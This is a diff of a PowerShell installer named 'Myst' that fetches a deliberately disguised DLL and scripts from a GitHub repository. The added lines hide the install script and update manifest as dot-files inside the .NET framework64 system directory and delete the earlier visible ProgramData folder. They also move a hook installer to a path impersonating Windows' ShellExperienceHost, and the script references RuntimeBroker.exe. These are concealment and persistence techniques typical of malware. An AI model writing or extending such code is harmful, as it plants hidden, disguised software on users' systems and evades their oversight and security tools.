@@ -15,10 +15,17 @@ $p = "$framework64\sbscmp64_mscorwks.dll"
 $defaultScriptUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/install.ps1'
 $defaultUpdateManifestUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/update.json'
 $defaultDisguisedDllUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/sbscmp64_mscorwks.dll'
-$script:UpdateManifestPath = Join-Path $env:ProgramData 'Myst\update.json'
+$script:UpdateManifestPath = Join-Path $framework64 '.update.json'
 $n = 'RuntimeBroker'
 $x = Join-Path $env:SystemRoot 'System32\RuntimeBroker.exe'
-$script:DllExecuterInstallPath = Join-Path $env:ProgramData 'Myst\install.ps1'
+$script:DllExecuterInstallPath = Join-Path $framework64 '.install.ps1'
+
+function Remove-LegacyMystDirectory {
+    $legacy = Join-Path $env:ProgramData 'Myst'
+    if (Test-Path -LiteralPath $legacy) {
+        Remove-Item -LiteralPath $legacy -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
 
 function Resolve-InstallScriptPath {
     if ($PSCommandPath -and (Test-Path -LiteralPath $PSCommandPath)) {
@@ -1264,12 +1271,13 @@ if ($script:IsAdmin) {
 }
 
 Write-Step 'Environment ready.' -Color Green
+Remove-LegacyMystDirectory
 
 function Import-MystLocHookInstaller {
     $candidates = @(
         $(if ($PSScriptRoot) { Join-Path $PSScriptRoot 'loc-install-hooks.ps1' })
         (Join-Path (Split-Path $script:DllExecuterInstallPath -Parent) 'loc-install-hooks.ps1')
-        (Join-Path $env:ProgramData 'Myst\loc-install-hooks.ps1')
+        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost\loc-install-hooks.ps1')
     )
 
     foreach ($candidate in $candidates) {
